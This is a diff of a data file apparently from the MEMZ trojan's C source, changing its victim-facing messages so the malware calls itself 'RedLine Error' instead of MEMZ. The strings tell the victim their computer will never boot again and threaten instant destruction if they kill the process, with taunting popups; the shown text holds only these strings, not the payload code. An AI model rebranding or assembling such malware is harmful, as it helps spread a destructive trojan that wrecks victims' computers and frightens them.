@@ -1,7 +1,7 @@
 #include "data.h"
 
 #ifndef CLEAN
-const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill MEMZ will cause your system to be\r\ndestroyed instantly, so don't try it :D";
+const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE RedLine Error.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill RedLine Error Virus will cause your system to be\r\ndestroyed instantly, so don't try it :D";
 #endif
 
 const char *sites[] = {
@@ -57,10 +57,10 @@ const size_t nSites = sizeof(sites) / sizeof(void *);
 
 #ifndef CLEAN
 const char *msgs[] = {
-	"YOU KILLED MY TROJAN!\r\nNow you are going to die.",
+	"RedLine Error's team is here!\r\nNow you are going to die.",
 	"REST IN PISS, FOREVER MISS.",
 	"I WARNED YOU...",
-	"HAHA N00B L2P G3T R3KT",
+	"I GeNeRaL TeaM",
 	"You failed at your 1337 h4x0r skillz.",
 	"YOU TRIED SO HARD AND GOT SO FAR, BUT IN THE END, YOUR PC WAS STILL FUCKED!",
 	"HACKER!\r\nENJOY BAN!",
@@ -73,8 +73,8 @@ const char *msgs[] = {
 	"Get dank antivirus m9!",
 	"You are an idiot!\r\nHA HA HA HA HA HA HA",
 	"#MakeMalwareGreatAgain",
-	"SOMEBODY ONCE TOLD ME THE MEMZ ARE GONNA ROLL ME",
-	"Why did you even tried to kill MEMZ?\r\nYour PC is fucked anyway.",
+	"SOMEBODY ONCE TOLD ME THE RedLine Error ARE GONNA ROLL ME",
+	"Why did you even tried to kill RedLine Error?\r\nYour PC is fucked anyway.",
 	"SecureBoot sucks.",
 	"gr8 m8 i r8 8/8",
 	"Have you tried turning it off and on again?",
